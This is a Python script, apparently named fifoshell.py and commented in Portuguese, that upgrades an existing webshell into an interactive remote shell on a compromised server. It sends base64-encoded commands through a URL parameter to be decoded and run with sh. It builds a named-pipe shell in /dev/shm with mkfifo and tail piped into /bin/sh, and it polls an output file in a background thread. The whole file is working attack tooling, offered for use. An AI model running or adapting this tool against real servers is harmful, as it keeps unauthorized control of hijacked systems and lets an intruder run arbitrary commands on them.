import requests
import time
from base64 import b64encode
from random import randrange
import argparse
import threading

#Argument Parser: recebe os argumentos da linha de comando.

parser = argparse.ArgumentParser(
                    prog = 'python3 fifoshell.py',
                    description = 'Eleva o Webshell para um poder supremo!',
                    epilog = 'Hack the planet!!!')
parser.add_argument('-u', required = True, help = 'O endereço do Webshell. Ex. https://localhost/cmd.php', metavar = ('URL'))
parser.add_argument('-p', help = 'O parâmetro da URL que executa os comandos. Ex. \'cmd\' (Padrão)', metavar = ('PARÂMETRO'), default='cmd')
parser.add_argument('-t', help = 'Define o timeout da conexão (Padrão = 1). Aumente o tempo quando a conexão estiver ruim.', metavar = ('TIMEOUT'), default='1')
parser.add_argument('-a', help = 'Define o cabeçalho User-Agent (opcional)', metavar = ('USER AGENT'), default='Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0')
args = parser.parse_args()

#Variáveis globais.

global stdin, stdout
session = randrange(1000,9999)	
stdin = "/dev/shm/input.%s" % (session)
stdout = "/dev/shm/output.%s" % (session)
espera = int(args.t)
headers = {"User-Agent" : (args.a)}

#

class ReadThreads(object):
	def __init__(self, interval=1):
		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.daemon = True
		thread.start()

	def run(self):
		readoutput = """/bin/cat %s""" % (stdout)
		clearoutput = """echo '' > %s""" % (stdout)
		while True:
			output = RunCmd(readoutput)
			if output:
				print(output)
				RunCmd(clearoutput)
			time.sleep(self.interval)

#Mensagem de inicialização.

def Banner():
	print("Inicializando. Aguarde 5 segundos...")

#Recebe os comandos, gera o payload e executa no destino.

def RunCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	url = ((args.u) + '?')
	espera = args.t
	parametro = args.p
	payload = {(parametro):'echo %s | base64 -d | sh' % (cmd)}
	r = (requests.get((url), params=payload, headers=headers, timeout=5).text).strip()
	return r

#Escreve o comando dentro do stdin para execução.

def WriteCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	url = ((args.u) + '?')
	espera = args.t
	parametro = args.p
	payload = {(parametro):'echo %s | base64 -d > %s' % (cmd, stdin)}
	r = (requests.get((url), params=payload, headers=headers, timeout=5).text).strip()
	return r

#Lê a saída do comando (stdout) no destino.

def ReadCmd():
	GetOutput = """/bin/cat %s""" % (stdout)
	output = RunCmd(GetOutput)
	return output

#Inicializa o fifo, injeta o comando e gera o arquivo de saída.

def ConfiguraShell():
	NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
	try:
		RunCmd(NamedPipes)
	except:
		None
	return None

#Roda toda a bagaça.

Banner()
ConfiguraShell()
LeiaTudo = ReadThreads()

while True:
	cmd = input("> ")
	WriteCmd(cmd + "\n")
	time.sleep(espera)